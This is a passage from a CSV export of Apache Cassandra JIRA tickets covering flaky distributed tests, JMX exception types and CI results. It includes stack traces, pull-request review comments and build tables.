		at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
		at java.lang.Thread.run(Thread.java:748)
	Caused by: java.lang.AssertionError
		at org.apache.cassandra.locator.TokenMetadata.firstTokenIndex(TokenMetadata.java:1171)
		at org.apache.cassandra.locator.TokenMetadata.firstToken(TokenMetadata.java:1185)
		at org.apache.cassandra.locator.AbstractReplicationStrategy.getNaturalReplicas(AbstractReplicationStrategy.java:95)
		at org.apache.cassandra.locator.AbstractReplicationStrategy.getLocalReplicaFor(AbstractReplicationStrategy.java:111)
		at org.apache.cassandra.db.ReadCommandVerbHandler.validateTransientStatus(ReadCommandVerbHandler.java:108)
		at org.apache.cassandra.db.ReadCommandVerbHandler.doVerb(ReadCommandVerbHandler.java:50)
		at org.apache.cassandra.net.InboundSink.lambda$new$0(InboundSink.java:78)
		at org.apache.cassandra.net.InboundSink.accept(InboundSink.java:97)

{code}

https://ci-cassandra.apache.org/job/Cassandra-4.1/28/testReport/org.apache.cassandra.distributed.test/SchemaTest/readRepair/",,bereng,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17641,,,CASSANDRA-17636,,,,,,CASSANDRA-17651,,,,,,CASSANDRA-17652,CASSANDRA-17307,CASSANDRA-17310,CASSANDRA-17636,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,DTest,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Jul 01 05:23:08 UTC 2022,,,,,,,All,,,,"0|z12ips:",9223372036854775807,,,,,,,,Normal,,,,,,,,,,,,,,,,,,"25/May/22 09:01;bereng;Probably a dup of CASSANDRA-17641;;;","01/Jul/22 05:23;bereng;Agreed CASSANDRA-17636 is the root cause. Optimistically closing all these duplicates and we can reopen if needed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Clients using JMX are unable to handle non-standard java types but we leak this into our Exceptions,CASSANDRA-17638,13445705,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,e.dimitrova,e.dimitrova,e.dimitrova,18/May/22 19:20,27/May/22 19:25,13/Jul/23 08:40,19/May/22 18:52,4.1,4.1-alpha1,,,,,Legacy/Observability,Observability/JMX,,,0,,"This is follow up ticket on CASSANDRA-17527 and CASSANDRA-17580. 
CASSANDRA-17580 was decided to be a backup non-default option for users who want to be 100% sure there are no leaked Cassandra exceptions. In that sense I will fix here all known ConfigurationExceptions that need to be thrown as IllegalArgumentException for the default behavior as we were always supposed to do that. ",,dcapwell,e.dimitrova,jmckenzie,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17668,,,,,,CASSANDRA-17580,CASSANDRA-17527,,,,,,,,,,,,,,,,,,,0.0,e.dimitrova,,,,,,,,,,,,,,Correctness,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri May 20 15:14:11 UTC 2022,,,,,,,All,,,,"0|z12hog:",9223372036854775807,,,,dcapwell,e.dimitrova,,,Normal,,,,https://github.com/apache/cassandra/commit/c635f198f6ceca272e61b857b67fd91f23da3836,,,,,,,,,"||PR||CI||
|[4.1|https://github.com/ekaterinadimitrova2/cassandra/pull/200]|[j8,|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1629/workflows/8cdc3a89-9f63-4395-8964-03a954f93f37] [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1629/workflows/675d33aa-8c67-4f85-b22b-ad425a004a02]|
|[trunk|https://github.com/ekaterinadimitrova2/cassandra/pull/201]|[j8,|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1630/workflows/a57aaea3-2ec9-4c34-9347-9e8679ecfecd] [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1630/workflows/e7bca094-523c-492a-a0cc-5ea7b628e01c]|

The current tests. 

While fixing the exceptions I noticed we didn't remove a validation not needed anymore which makes just an additional empty read of the cassandra.yaml without a need anymore. I did it in this [commit|https://github.com/apache/cassandra/commit/8f0685da22596fe88dc87186ea5e2b673c3613ab].

Some context: 
IsBlank is redundant when we have commitlog_sync_period and commitlog_sync_group_window default to 0ms and not 0, that was enough to prevent from the issue with allowing empty value in the yaml
I added a new test to confirm we didn't break anything. Unfortunately, the test failed in CI as I didn't commit the last fix I had for it.I added the commit now but not rerunning full CI for that one. There are two other tests with known unrelated failures.",,,,,"18/May/22 19:26;e.dimitrova;I plan to fix here all new for this release I know about exceptions:
 * Methods I noticed in the DatabaseDescriptor which are still not in any release
 * The exceptions in the constructors for the new config

I suggest we fix old already in a release issues in a separate ticket which will cover all branches and get this one out before the release

CC [~dcapwell] , [~mck] 

I will post a patch in a bit;;;","19/May/22 17:16;e.dimitrova;[~dcapwell] do you mind to review? You already saw the initial version plus you are familiar with the problems/solutions.

One notable change is this one to be carefully verified I didn't misunderstood something. - [https://github.com/ekaterinadimitrova2/cassandra/pull/200/commits/ddf4d1ceacf047fc2867c9e8d688e507a3b3d33a#diff-9a49417aa0801ae88678da70e5e9fee41b7d5977217252059b4f5aa886941f32L232-R250];;;","19/May/22 17:54;dcapwell;+1 assuming you fix the 1 spacing issue;;;","19/May/22 18:33;e.dimitrova;Fixed and test successfully rerun. Added CHANGES.txt. Starting commit.

No new full CI will be run as we have single commit today which is a test fix, completely disconnected from this patch.;;;","19/May/22 18:51;e.dimitrova;Committed, thanks

To https://github.com/apache/cassandra.git

   0a7084a05d..c635f198f6  cassandra-4.1 -> cassandra-4.1

   733a4a58ef..23e5da9358  trunk -> trunk;;;","20/May/22 15:14;jmckenzie;Poor, poor ASF CI infra. It's having a bad week; not sure how much to read into the failures below, but adding for visibility just in case.

 

[CI Results]
Branch: 4.1, build number: 29
butler url: [https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1]
jenkins url: [https://ci-cassandra.apache.org/job/Cassandra-4.1/29/]
JIRA: CASSANDRA-17638
commit url: [https://git-wip-us.apache.org/repos/asf?p=cassandra.git;a=commit;h=c635f198f6ceca272e61b857b67fd91f23da3836]
affected paths:
 * src/java/org/apache/cassandra/config/DataStorageSpec.java
 * src/java/org/apache/cassandra/config/YamlConfigurationLoader.java
 * test/unit/org/apache/cassandra/config/SmallestDurationMinutesTest.java
 * src/java/org/apache/cassandra/config/DataRateSpec.java
 * test/unit/org/apache/cassandra/db/guardrails/GuardrailMinimumReplicationFactorTest.java
 * test/unit/org/apache/cassandra/config/DatabaseDescriptorTest.java
 * test/unit/org/apache/cassandra/config/SmallestDurationMillisecondsTest.java
 * src/java/org/apache/cassandra/config/DurationSpec.java
 * test/unit/org/apache/cassandra/config/DurationSpecTest.java
 * test/unit/org/apache/cassandra/config/SmallestDataStorageMebibytesTest.java
 * test/unit/org/apache/cassandra/config/DataRateSpecTest.java
 * test/unit/org/apache/cassandra/tools/nodetool/SetGetColumnIndexSizeTest.java
 * test/unit/org/apache/cassandra/config/YamlConfigurationLoaderTest.java
 * src/java/org/apache/cassandra/config/DatabaseDescriptor.java
 * CHANGES.txt
 * test/unit/org/apache/cassandra/config/SmallestDurationSecondsTest.java
 * test/unit/org/apache/cassandra/config/SmallestDataStorageKibibytesTest.java
 * test/unit/org/apache/cassandra/tools/nodetool/SnapshotTest.java
 * test/unit/org/apache/cassandra/db/guardrails/ThresholdTester.java
 * test/unit/org/apache/cassandra/config/DataStorageSpecTest.java

Build Result: UNSTABLE
Passing Tests: 47514
Failing Tests: 21
||Test|Failures|JIRA|
|cql3.validation.operations.SelectTest.testRangeQuery|1 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|db.RepairedDataTombstonesTest.compactionDropExpiredSSTableTest|2 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|cql3.ViewComplexTTLTest.testUpdateColumnInViewPKWithTTLWithFlush[3]|6 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|db.commitlog.CommitLogSegmentManagerCDCTest.testSwitchingCDCWriteModes|8 of 27|CASSANDRA-17542?|
|db.RepairedDataTombstonesTest.compactionTest|2 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|db.RepairedDataTombstonesTest.readTestRowTombstones|2 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|cql3.validation.operations.CompactStorageTest.testEmptyRestrictionValue|4 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|db.virtual.GossipInfoTableTest.testSelectAllWithStateTransitions-cdc|2 of 27|CASSANDRA-17584?|
|dtest.read_repair_test.TestSpeculativeReadRepair.test_quorum_requirement_on_speculated_read|1 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|cql3.validation.operations.SelectTest.testEmptyRestrictionValue|1 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|cql3.ViewFilteringClustering1Test.testClusteringKeySliceRestrictions[3]|4 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|db.RepairedDataTombstonesTest.readTest|2 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|tools.TopPartitionsTest.testServiceTopPartitionsSingleTable|3 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|cql3.validation.entities.SecondaryIndexTest.testWithEmptyRestrictionValueAndSecondaryIndex|3 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|db.RepairedDataTombstonesTest.readTestPartitionTombstones|2 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|db.RepairedDataTombstonesTest.readTestOldUnrepaired|2 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|cql3.validation.entities.SecondaryIndexTest.testIndexOnFrozenUDT|2 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|cql3.validation.operations.CompactStorageTest.testStaticCompactWithCounters|1 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|db.compaction.LongLeveledCompactionStrategyCQLTest.stressTestCompactionStrategyManager|1 of 27|CASSANDRA-16637?|
|db.RepairedDataTombstonesTest.readOnlyUnrepairedTest|2 of 27|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|distributed.test.SchemaTest.readRepair|5 of 27|CASSANDRA-17641?|;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test failure: compaction_test.py::TestCompaction::test_compaction_throughput,CASSANDRA-17637,13445683,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,,adelapena,adelapena,18/May/22 17:13,29/Jun/22 19:21,13/Jul/23 08:40,29/Jun/22 19:21,4.1.x,,,,,,Test/dtest/python,,,,0,,"The Python dtest {{compaction_test.py::TestCompaction::test_compaction_throughput}} seems to occasionally fail on CircleCI for 4.1:

* [https://app.circleci.com/pipelines/github/adelapena/cassandra/1575/workflows/293c4c89-0293-4628-b969-ab0008b38b5a/jobs/16797]

* [https://app.circleci.com/pipelines/github/adelapena/cassandra/1575/workflows/5a491573-faf3-42c4-99c7-747de85f9865/jobs/16795/tests]

* [https://app.circleci.com/pipelines/github/adelapena/cassandra/1564/workflows/31dc3bd6-0006-47f0-af4e-5cd568be89be/jobs/16664]

{code:java}
test teardown failure
Unexpected error found in node logs (see stdout for full details). Errors: [[node1] 'ERROR [Native-Transport-Requests-25] 2022-05-18 16:54:00,985 StorageProxy.java:1631 - Failed to apply mutation locally : \njava.lang.RuntimeException: null for ks: keyspace1, table: standard1\n\tat org.apache.cassandra.db.ColumnFamilyStore.apply(ColumnFamilyStore.java:1442)\n\tat org.apache.cassandra.db.CassandraTableWriteHandler.write(CassandraTableWriteHandler.java:40)\n\tat org.apache.cassandra.db.Keyspace.applyInternal(Keyspace.java:653)\n\tat org.apache.cassandra.db.Keyspace.apply(Keyspace.java:506)\n\tat org.apache.cassandra.db.Mutation.apply(Mutation.java:228)\n\tat org.apache.cassandra.db.Mutation.apply(Mutation.java:248)\n\tat org.apache.cassandra.service.StorageProxy$4.runMayThrow(StorageProxy.java:1625)\n\tat org.apache.cassandra.service.StorageProxy$LocalMutationRunnable.run(StorageProxy.java:2537)\n\tat org.apache.cassandra.concurrent.ExecutionFailure$1.run(ExecutionFailure.java:124)\n\tat org.apache.cassandra.concurrent.SEPExecutor.maybeExecuteImmediately(SEPExecutor.java:214)\n\tat org.apache.cassandra.concurrent.Stage.maybeExecuteImmediately(Stage.java:127)\n\tat org.apache.cassandra.service.StorageProxy.performLocally(StorageProxy.java:1619)\n\tat org.apache.cassandra.service.StorageProxy.sendToHintedReplicas(StorageProxy.java:1526)\n\tat org.apache.cassandra.service.StorageProxy.lambda$static$0(StorageProxy.java:212)\n\tat org.apache.cassandra.service.StorageProxy.performWrite(StorageProxy.java:1358)\n\tat org.apache.cassandra.service.StorageProxy.mutate(StorageProxy.java:867)\n\tat org.apache.cassandra.service.StorageProxy.mutateWithTriggers(StorageProxy.java:1129)\n\tat org.apache.cassandra.cql3.statements.ModificationStatement.executeWithoutCondition(ModificationStatement.java:516)\n\tat org.apache.cassandra.cql3.statements.ModificationStatement.execute(ModificationStatement.java:491)\n\tat org.apache.cassandra.cql3.QueryProcessor.processStatement(QueryProcessor.java:258)\n\tat org.apache.cassandra.cql3.QueryProcessor.processPrepared(QueryProcessor.java:825)\n\tat org.apache.cassandra.cql3.QueryProcessor.processPrepared(QueryProcessor.java:803)\n\tat org.apache.cassandra.transport.messages.ExecuteMessage.execute(ExecuteMessage.java:167)\n\tat org.apache.cassandra.transport.Message$Request.execute(Message.java:254)\n\tat org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:122)\n\tat org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:141)\n\tat org.apache.cassandra.transport.Dispatcher.processRequest(Dispatcher.java:168)\n\tat org.apache.cassandra.transport.Dispatcher.lambda$dispatch$0(Dispatcher.java:82)\n\tat org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:81)\n\tat org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:47)\n\tat org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:57)\n\tat org.apache.cassandra.concurrent.SEPWorker.run(SEPWorker.java:120)\n\tat io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)\n\tat java.base/java.lang.Thread.run(Thread.java:829)\nCaused by: java.lang.NullPointerException: null\n\tat org.apache.cassandra.db.memtable.AbstractMemtableWithCommitlog.accepts(AbstractMemtableWithCommitlog.java:101)\n\tat org.apache.cassandra.db.lifecycle.Tracker.getMemtableFor(Tracker.java:329)\n\tat org.apache.cassandra.db.ColumnFamilyStore.apply(ColumnFamilyStore.java:1421)\n\t... 33 common frames omitted']
{code}
However, I haven't yet seen this failure in Butler's results for Jenkins.",,adelapena,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17587,,,,,,,,,,,,,,,CASSANDRA-17587,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,,,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jun 29 19:20:56 UTC 2022,,,,,,,All,,,,"0|z12hjk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Jun/22 23:09;e.dimitrova;[~adelapena] I think this Is duplicate of 
CASSANDRA-17587?;;;","28/Jun/22 10:57;adelapena;It seems it is a duplicate. However, we should probably give {{test_compaction_throughput}} a run in the multiplexer just in case, since I think CASSANDRA-17587 contains repeateds run of {{test_user_defined_compaction}} only.;;;","29/Jun/22 15:59;e.dimitrova;Good point!

Now that CASSANDRA-17587 fix is committed I pushed 500 runs for the whole class here with 4.1:

[https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=compaction_throughput&filter=all]

Let's see if it will show something;;;","29/Jun/22 19:20;e.dimitrova;Ok, it seems 500 times j8-j8, j8-j11, j11-j11 was too much and they still run... 

But so far around 4-5 runs per container, 3 jobs 25 parallel runs - this means so far it passed like more than 300 times. I consider this enough to close the ticket as fixed already. Please feel free to reopen if you disagree. Stopping the CI run as I consider more runs at this point waste of resources.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test Failure: org.apache.cassandra.distributed.upgrade.MixedModeFrom3ReplicationTest.testSimpleStrategy,CASSANDRA-17636,13445679,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jonmeredith,adelapena,adelapena,18/May/22 17:02,07/Mar/23 10:38,13/Jul/23 08:40,30/Jun/22 23:23,4.1.x,4.1-beta1,5.0,,,,Test/dtest/java,,,,0,,"The upgrade in-JVM dtest {{org.apache.cassandra.distributed.upgrade.MixedModeFrom3ReplicationTest.testSimpleStrategy}} is flaky on 4.1 and trunk.

Jenkins failure:
https://ci-cassandra.apache.org/job/Cassandra-4.1/21/testReport/org.apache.cassandra.distributed.upgrade/MixedModeFrom3UnloggedBatchTest/testSimpleStrategy/
https://ci-cassandra.apache.org/job/Cassandra-trunk/1149/testReport/org.apache.cassandra.distributed.upgrade/MixedModeFrom3ReplicationTest/testSimpleStrategy_2/

Circle failure:
https://app.circleci.com/pipelines/github/adelapena/cassandra/1564/workflows/e8dbd50a-d574-4ef8-a741-795a93cd3e85/jobs/16725

Error Message:
{code}
Uncaught exceptions were thrown during test
{code}

Stacktrace:
{code}
org.apache.cassandra.distributed.shared.ShutdownException: Uncaught exceptions were thrown during test
	at org.apache.cassandra.distributed.impl.AbstractCluster.checkAndResetUncaughtExceptions(AbstractCluster.java:1056)
	at org.apache.cassandra.distributed.impl.AbstractCluster.close(AbstractCluster.java:1042)
	at org.apache.cassandra.distributed.upgrade.UpgradeTestBase$TestCase.run(UpgradeTestBase.java:239)
	at org.apache.cassandra.distributed.upgrade.MixedModeBatchTestBase.testSimpleStrategy(MixedModeBatchTestBase.java:78)
	at org.apache.cassandra.distributed.upgrade.MixedModeBatchTestBase.testSimpleStrategy(MixedModeBatchTestBase.java:48)
	at org.apache.cassandra.distributed.upgrade.MixedModeFrom3UnloggedBatchTest.testSimpleStrategy(MixedModeFrom3UnloggedBatchTest.java:36)
	Suppressed: java.lang.RuntimeException: java.lang.AssertionError
		at org.apache.cassandra.net.InboundSink.accept(InboundSink.java:108)
		at org.apache.cassandra.distributed.impl.Instance.lambda$null$6(Instance.java:495)
		at org.apache.cassandra.concurrent.ExecutionFailure$1.run(ExecutionFailure.java:124)
		at org.apache.cassandra.concurrent.SEPWorker.run(SEPWorker.java:120)
		at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
		at java.lang.Thread.run(Thread.java:748)
	Caused by: java.lang.AssertionError
		at org.apache.cassandra.locator.TokenMetadata.firstTokenIndex(TokenMetadata.java:1171)
		at org.apache.cassandra.locator.TokenMetadata.firstToken(TokenMetadata.java:1185)
		at org.apache.cassandra.locator.AbstractReplicationStrategy.getNaturalReplicas(AbstractReplicationStrategy.java:95)
		at org.apache.cassandra.locator.AbstractReplicationStrategy.getLocalReplicaFor(AbstractReplicationStrategy.java:111)
		at org.apache.cassandra.db.ReadCommandVerbHandler.validateTransientStatus(ReadCommandVerbHandler.java:108)
		at org.apache.cassandra.db.ReadCommandVerbHandler.doVerb(ReadCommandVerbHandler.java:50)
		at org.apache.cassandra.net.InboundSink.lambda$new$0(InboundSink.java:78)
		at org.apache.cassandra.net.InboundSink.accept(InboundSink.java:97)
	Suppressed: java.lang.RuntimeException: java.lang.AssertionError
		at org.apache.cassandra.net.InboundSink.accept(InboundSink.java:108)
		at org.apache.cassandra.distributed.impl.Instance.lambda$null$6(Instance.java:495)
		at org.apache.cassandra.concurrent.ExecutionFailure$1.run(ExecutionFailure.java:124)
		at org.apache.cassandra.concurrent.SEPWorker.run(SEPWorker.java:120)
		at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
		at java.lang.Thread.run(Thread.java:748)
	Caused by: java.lang.AssertionError
		at org.apache.cassandra.locator.TokenMetadata.firstTokenIndex(TokenMetadata.java:1171)
		at org.apache.cassandra.locator.TokenMetadata.firstToken(TokenMetadata.java:1185)
		at org.apache.cassandra.locator.AbstractReplicationStrategy.getNaturalReplicas(AbstractReplicationStrategy.java:95)
		at org.apache.cassandra.locator.AbstractReplicationStrategy.getLocalReplicaFor(AbstractReplicationStrategy.java:111)
		at org.apache.cassandra.db.ReadCommandVerbHandler.validateTransientStatus(ReadCommandVerbHandler.java:108)
		at org.apache.cassandra.db.ReadCommandVerbHandler.doVerb(ReadCommandVerbHandler.java:50)
		at org.apache.cassandra.net.InboundSink.lambda$new$0(InboundSink.java:78)
		at org.apache.cassandra.net.InboundSink.accept(InboundSink.java:97)
{code}",,adelapena,bereng,brandon.williams,dcapwell,jmckenzie,jonmeredith,maedhroz,,,,,,,,"jonmeredith opened a new pull request, #1708:
URL: https://github.com/apache/cassandra/pull/1708

   See https://issues.apache.org/jira/browse/CASSANDRA-17636


;29/Jun/22 00:41;githubbot;600","jonmeredith opened a new pull request, #1709:
URL: https://github.com/apache/cassandra/pull/1709

   See https://issues.apache.org/jira/browse/CASSANDRA-17636


;29/Jun/22 00:41;githubbot;600","jonmeredith opened a new pull request, #1710:
URL: https://github.com/apache/cassandra/pull/1710

   See https://issues.apache.org/jira/browse/CASSANDRA-17636


;29/Jun/22 00:41;githubbot;600","dcapwell commented on code in PR #1708:
URL: https://github.com/apache/cassandra/pull/1708#discussion_r909106300


##########
test/distributed/org/apache/cassandra/distributed/action/GossipHelper.java:
##########
@@ -412,7 +414,9 @@ public static void changeGossipState(IInvokableInstance target, IInstance peer,
     {
         InetSocketAddress addr = peer.broadcastAddress();
         UUID hostId = peer.config().hostId();
-        int netVersion = peer.getMessagingVersion();
+        int peerVersion = peer.getMessagingVersion();
+        final int netVersion = peerVersion == 0 ? target.getMessagingVersion() :  peerVersion;
+        assert netVersion != 0 : ""Unable to determine messaging version for peer {}"" + peer.config().num();

Review Comment:
   nit: this is duplicate logic; would be good to create utility function



;29/Jun/22 00:48;githubbot;600","jonmeredith commented on PR #1710:
URL: https://github.com/apache/cassandra/pull/1710#issuecomment-1171614373

   Merged.


;30/Jun/22 19:50;githubbot;600","jonmeredith closed pull request #1710: CASSANDRA-17636 trunk
URL: https://github.com/apache/cassandra/pull/1710


;30/Jun/22 19:50;githubbot;600","jonmeredith commented on PR #1709:
URL: https://github.com/apache/cassandra/pull/1709#issuecomment-1171614516

   Merged


;30/Jun/22 19:50;githubbot;600","jonmeredith closed pull request #1709: CASSANDRA-17636 4.1
URL: https://github.com/apache/cassandra/pull/1709


;30/Jun/22 19:50;githubbot;600","jonmeredith commented on PR #1708:
URL: https://github.com/apache/cassandra/pull/1708#issuecomment-1171614665

   Merged


;30/Jun/22 19:50;githubbot;600","jonmeredith closed pull request #1708: CASSANDRA-17636 4.0
URL: https://github.com/apache/cassandra/pull/1708


;30/Jun/22 19:50;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,6000,,,0,6000,,,,,,,,,,,,,,,,,CASSANDRA-17651,CASSANDRA-17641,CASSANDRA-17652,CASSANDRA-17642,CASSANDRA-17641,CASSANDRA-17642,CASSANDRA-17651,CASSANDRA-17652,CASSANDRA-17307,CASSANDRA-17310,CASSANDRA-17656,,,,,,,,,,,,,,,,,,,,0.0,jonmeredith,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jul 06 18:51:41 UTC 2022,,,,,,,All,,,,"0|z12hio:",9223372036854775807,,,,dcapwell,,,,Critical,,4.0,,https://github.com/apache/cassandra/commit/0119beee7afb18ae1201da2d5bbbae80ce0dc545,,,,,,,,,"[4.0 PR|https://github.com/apache/cassandra/pull/1708]
[4.1 PR|https://github.com/apache/cassandra/pull/1709]
[trunk PR|https://github.com/apache/cassandra/pull/1710]",,,,,"22/Jun/22 20:00;jonmeredith;I think the issue here is that the test uses mock messaging which still permits messages in upgraded nodes before they would normally be able to receive them.  For example a read repair being delivered before token metadata is started. I'll post a patch shortly.;;;","29/Jun/22 00:44;jonmeredith;heh, put this in the doc plan by mistake

[4.0 PR|https://github.com/apache/cassandra/pull/1708]
[4.1 PR|https://github.com/apache/cassandra/pull/1709]
[trunk PR|https://github.com/apache/cassandra/pull/1710];;;","29/Jun/22 00:45;jonmeredith;CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-4.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17636-cassandra-4.0-D1CAC8AF-3E66-4221-BA9B-07E799658E38]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17636-cassandra-4.0-D1CAC8AF-3E66-4221-BA9B-07E799658E38]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1813/]|
|cassandra-4.1|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17636-cassandra-4.1-D1CAC8AF-3E66-4221-BA9B-07E799658E38]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17636-cassandra-4.1-D1CAC8AF-3E66-4221-BA9B-07E799658E38]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1814/]|
|trunk|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17636-trunk-D1CAC8AF-3E66-4221-BA9B-07E799658E38]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17636-trunk-D1CAC8AF-3E66-4221-BA9B-07E799658E38]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1815/]|;;;","29/Jun/22 00:49;dcapwell;Patch LGTM +1.

My only comment is a small nit I put in the 4.0 patch (applies to all branches);;;","29/Jun/22 20:42;jonmeredith;Factored out the repeated code into a helper method and changed the way the in-instance logger was initialized as it was causing test failures.

 CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-4.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17636-cassandra-4.0-A978A1FB-9CF8-4BDB-9087-0106D3433813]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17636-cassandra-4.0-A978A1FB-9CF8-4BDB-9087-0106D3433813]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1819/]|
|cassandra-4.1|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17636-cassandra-4.1-A978A1FB-9CF8-4BDB-9087-0106D3433813]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17636-cassandra-4.1-A978A1FB-9CF8-4BDB-9087-0106D3433813]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1820/]|
